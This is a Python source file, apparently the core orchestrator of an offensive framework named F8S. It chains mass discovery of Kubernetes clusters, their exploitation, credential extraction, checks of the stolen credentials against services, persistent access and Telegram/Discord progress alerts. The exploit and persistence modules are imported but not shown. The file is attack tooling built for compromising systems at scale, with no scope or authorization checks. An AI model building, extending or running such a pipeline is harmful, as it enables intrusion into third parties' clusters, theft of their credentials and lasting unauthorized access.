#!/usr/bin/env python3
"""
🎯 F8S Core Orchestrator
Main pipeline coordinator for scan → exploit → extract → validate → notify

Author: wKayaa
Date: 2025-01-28
"""

import asyncio
import time
from datetime import datetime
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
import json

# Module imports
from modules.scanner.discovery import K8sDiscoveryScanner
from modules.exploiter.k8s_exploiter import K8sExploiter
from modules.extractors.credential_extractor import CredentialExtractor
from modules.validators.service_validator import ServiceValidator
from modules.persistence.access_maintainer import AccessMaintainer

# Integration imports
from integrations.telegram_notifier import TelegramNotifier
from integrations.discord_notifier import DiscordNotifier
from integrations.web_interface import WebInterface
from integrations.api_server import APIServer

# Utility imports
from utils.target_expander import TargetExpander
from utils.rate_limiter import RateLimiter
from reporting.report_generator import ReportGenerator


@dataclass
class PipelineResult:
    """Result of a complete pipeline execution"""
    session_id: str
    mode: str
    start_time: datetime
    end_time: datetime
    targets_processed: int
    clusters_found: int
    clusters_exploited: int
    credentials_extracted: int
    credentials_validated: int
    services_compromised: int
    persistent_access: int
    notifications_sent: int
    success: bool
    error_message: Optional[str] = None


class F8SOrchestrator:
    """Main orchestrator for F8S Framework pipeline"""
    
    def __init__(self, config, session_manager, error_handler, args):
        self.config = config
        self.session_manager = session_manager
        self.error_handler = error_handler
        self.args = args
        
        # Core modules (initialized in initialize())
        self.scanner = None
        self.exploiter = None
        self.extractor = None
        self.validator = None
        self.persistence = None
        
        # Integrations
        self.telegram_notifier = None
        self.discord_notifier = None
        self.web_interface = None
        self.api_server = None
        
        # Utilities
        self.target_expander = TargetExpander()
        self.rate_limiter = RateLimiter(max_concurrent=args.threads)
        self.report_generator = ReportGenerator(args.output)
        
        # Stats tracking
        self.stats = {
            "targets_processed": 0,
            "clusters_found": 0,
            "clusters_exploited": 0,
            "credentials_extracted": 0,
            "credentials_validated": 0,
            "services_compromised": 0,
            "persistent_access": 0,
            "notifications_sent": 0,
            "errors": []
        }
    
    async def initialize(self):
        """Initialize all orchestrator components"""
        print("🔧 Initializing F8S Framework components...")
        
        try:
            # Initialize core modules
            self.scanner = K8sDiscoveryScanner(
                timeout=self.args.timeout,
                max_concurrent=self.args.threads,
                error_handler=self.error_handler
            )
            
            self.exploiter = K8sExploiter(
                mode=self.args.mode,
                timeout=self.args.timeout,
                error_handler=self.error_handler
            )
            
            self.extractor = CredentialExtractor(
                error_handler=self.error_handler
            )
            
            if not self.args.skip_validation:
                self.validator = ServiceValidator(
                    timeout=self.args.timeout,
                    error_handler=self.error_handler
                )
            
            self.persistence = AccessMaintainer(
                error_handler=self.error_handler
            )
            
            # Initialize integrations
            if self.args.telegram_token:
                self.telegram_notifier = TelegramNotifier(
                    token=self.args.telegram_token,
                    chat_id=self.args.telegram_chat
                )
                await self.telegram_notifier.initialize()
            
            if self.args.discord_webhook:
                self.discord_notifier = DiscordNotifier(
                    webhook_url=self.args.discord_webhook
                )
            
            print("✅ All components initialized successfully")
            
        except Exception as e:
            print(f"❌ Initialization failed: {str(e)}")
            raise
    
    async def run_pipeline(self, targets: List[str], mode: str) -> PipelineResult:
        """Execute the complete F8S pipeline"""
        session_id = self.session_manager.get_current_session()
        start_time = datetime.utcnow()
        
        print(f"🚀 Starting F8S pipeline (Session: {session_id})")
        await self._notify_start(session_id, mode, len(targets))
        
        try:
            # Phase 1: Target Discovery & Scanning
            print("\n🔍 Phase 1: Target Discovery & Scanning")
            expanded_targets = await self.target_expander.expand_targets(targets)
            discovered_clusters = await self._run_discovery_phase(expanded_targets)
            
            if not discovered_clusters:
                print("⚠️ No Kubernetes clusters discovered")
                return self._create_result(session_id, mode, start_time, success=False, 
                                         error_message="No clusters found")
            
            print(f"✅ Phase 1 complete: {len(discovered_clusters)} clusters discovered")
            
            # Phase 2: Exploitation
            print(f"\n⚡ Phase 2: Exploitation ({mode} mode)")
            exploited_clusters = await self._run_exploitation_phase(discovered_clusters, mode)
            
            if not exploited_clusters:
                print("⚠️ No clusters successfully exploited")
                return self._create_result(session_id, mode, start_time, success=False,
                                         error_message="No successful exploitations")
            
            print(f"✅ Phase 2 complete: {len(exploited_clusters)} clusters exploited")
            
            # Phase 3: Credential Extraction
            print("\n🔑 Phase 3: Credential Extraction")
            extracted_credentials = await self._run_extraction_phase(exploited_clusters)
            
            print(f"✅ Phase 3 complete: {len(extracted_credentials)} credentials extracted")
            
            # Phase 4: Service Validation (if not skipped)
            validated_credentials = []
            if not self.args.skip_validation and self.validator:
                print("\n🔐 Phase 4: Service Validation")
                validated_credentials = await self._run_validation_phase(extracted_credentials)
                print(f"✅ Phase 4 complete: {len(validated_credentials)} credentials validated")
            
            # Phase 5: Persistence & Access Maintenance
            print("\n🔒 Phase 5: Persistence & Access Maintenance")
            persistent_access = await self._run_persistence_phase(validated_credentials or extracted_credentials)
            
            print(f"✅ Phase 5 complete: {len(persistent_access)} persistent accesses established")
            
            # Final notification
            end_time = datetime.utcnow()
            await self._notify_completion(session_id, start_time, end_time)
            
            return self._create_result(
                session_id, mode, start_time, end_time, success=True,
                clusters_found=len(discovered_clusters),
                clusters_exploited=len(exploited_clusters),
                credentials_extracted=len(extracted_credentials),
                credentials_validated=len(validated_credentials),
                persistent_access=len(persistent_access)
            )
            
        except Exception as e:
            error_msg = f"Pipeline failed: {str(e)}"
            print(f"❌ {error_msg}")
            await self._notify_error(session_id, error_msg)
            
            return self._create_result(session_id, mode, start_time, success=False, 
                                     error_message=error_msg)
    
    async def _run_discovery_phase(self, targets: List[str]) -> List[Dict]:
        """Phase 1: Discovery and scanning"""
        discovered_clusters = []
        
        async with self.rate_limiter:
            tasks = []
            for target in targets:
                task = self.error_handler.execute_with_retry(
                    self.scanner.scan_target, target
                )
                tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, dict) and result.get('clusters'):
                    discovered_clusters.extend(result['clusters'])
                    self.stats["targets_processed"] += 1
        
        self.stats["clusters_found"] = len(discovered_clusters)
        return discovered_clusters
    
    async def _run_exploitation_phase(self, clusters: List[Dict], mode: str) -> List[Dict]:
        """Phase 2: Exploitation"""
        exploited_clusters = []
        
        async with self.rate_limiter:
            tasks = []
            for cluster in clusters:
                task = self.error_handler.execute_with_retry(
                    self.exploiter.exploit_cluster, cluster, mode
                )
                tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, dict) and result.get('success'):
                    exploited_clusters.append(result)
        
        self.stats["clusters_exploited"] = len(exploited_clusters)
        return exploited_clusters
    
    async def _run_extraction_phase(self, clusters: List[Dict]) -> List[Dict]:
        """Phase 3: Credential extraction"""
        extracted_credentials = []
        
        for cluster in clusters:
            try:
                credentials = await self.extractor.extract_credentials(cluster)
                if credentials:
                    extracted_credentials.extend(credentials)
            except Exception as e:
                self.stats["errors"].append(f"Extraction failed for {cluster.get('endpoint', 'unknown')}: {str(e)}")
        
        self.stats["credentials_extracted"] = len(extracted_credentials)
        return extracted_credentials
    
    async def _run_validation_phase(self, credentials: List[Dict]) -> List[Dict]:
        """Phase 4: Service validation"""
        validated_credentials = []
        
        async with self.rate_limiter:
            tasks = []
            for credential in credentials:
                task = self.error_handler.execute_with_retry(
                    self.validator.validate_credential, credential
                )
                tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, dict) and result.get('valid'):
                    validated_credentials.append(result)
        
        self.stats["credentials_validated"] = len(validated_credentials)
        return validated_credentials
    
    async def _run_persistence_phase(self, credentials: List[Dict]) -> List[Dict]:
        """Phase 5: Persistence and access maintenance"""
        persistent_access = []
        
        for credential in credentials:
            try:
                access = await self.persistence.establish_persistence(credential)
                if access:
                    persistent_access.append(access)
            except Exception as e:
                self.stats["errors"].append(f"Persistence failed for {credential.get('type', 'unknown')}: {str(e)}")
        
        self.stats["persistent_access"] = len(persistent_access)
        return persistent_access
    
    async def _notify_start(self, session_id: str, mode: str, target_count: int):
        """Send start notifications"""
        message = f"🚀 F8S Framework Started\nSession: {session_id}\nMode: {mode}\nTargets: {target_count}"
        
        if self.telegram_notifier:
            await self.telegram_notifier.send_message(message)
            self.stats["notifications_sent"] += 1
        
        if self.discord_notifier:
            await self.discord_notifier.send_message(message)
            self.stats["notifications_sent"] += 1
    
    async def _notify_completion(self, session_id: str, start_time: datetime, end_time: datetime):
        """Send completion notifications"""
        duration = (end_time - start_time).total_seconds()
        
        message = f"""✅ F8S Framework Completed
Session: {session_id}
Duration: {duration:.1f}s
Clusters Found: {self.stats['clusters_found']}
Clusters Exploited: {self.stats['clusters_exploited']}
Credentials Extracted: {self.stats['credentials_extracted']}
Credentials Validated: {self.stats['credentials_validated']}
Persistent Access: {self.stats['persistent_access']}"""
        
        if self.telegram_notifier:
            await self.telegram_notifier.send_message(message)
            self.stats["notifications_sent"] += 1
        
        if self.discord_notifier:
            await self.discord_notifier.send_message(message)
            self.stats["notifications_sent"] += 1
    
    async def _notify_error(self, session_id: str, error_message: str):
        """Send error notifications"""
        message = f"❌ F8S Framework Error\nSession: {session_id}\nError: {error_message}"
        
        if self.telegram_notifier:
            await self.telegram_notifier.send_message(message)
        
        if self.discord_notifier:
            await self.discord_notifier.send_message(message)
    
    def _create_result(self, session_id: str, mode: str, start_time: datetime, 
                      end_time: datetime = None, success: bool = False, **kwargs) -> PipelineResult:
        """Create pipeline result object"""
        if end_time is None:
            end_time = datetime.utcnow()
        
        return PipelineResult(
            session_id=session_id,
            mode=mode,
            start_time=start_time,
            end_time=end_time,
            targets_processed=self.stats.get("targets_processed", 0),
            clusters_found=kwargs.get("clusters_found", self.stats.get("clusters_found", 0)),
            clusters_exploited=kwargs.get("clusters_exploited", self.stats.get("clusters_exploited", 0)),
            credentials_extracted=kwargs.get("credentials_extracted", self.stats.get("credentials_extracted", 0)),
            credentials_validated=kwargs.get("credentials_validated", self.stats.get("credentials_validated", 0)),
            services_compromised=kwargs.get("services_compromised", 0),
            persistent_access=kwargs.get("persistent_access", self.stats.get("persistent_access", 0)),
            notifications_sent=self.stats.get("notifications_sent", 0),
            success=success,
            error_message=kwargs.get("error_message")
        )
    
    async def start_web_interface(self):
        """Start web interface"""
        if not self.web_interface:
            self.web_interface = WebInterface(self, port=5000)
            await self.web_interface.start()
            print("🌐 Web interface started on http://localhost:5000")
    
    async def start_api_server(self):
        """Start API server"""
        if not self.api_server:
            self.api_server = APIServer(self, port=8080)
            await self.api_server.start()
            print("🔌 API server started on http://localhost:8080")
    
    async def generate_reports(self, results: PipelineResult):
        """Generate reports and exports"""
        print("📊 Generating reports...")
        
        await self.report_generator.generate_report(
            results, 
            self.stats,
            format=self.args.export_format
        )
        
        print(f"✅ Reports generated in {self.args.output}")
    
    async def cleanup(self):
        """Cleanup resources and temporary files"""
        print("🧹 Cleaning up...")
        
        # Cleanup modules
        if self.persistence:
            await self.persistence.cleanup()
        
        if self.web_interface:
            await self.web_interface.stop()
        
        if self.api_server:
            await self.api_server.stop()
        
        print("✅ Cleanup completed")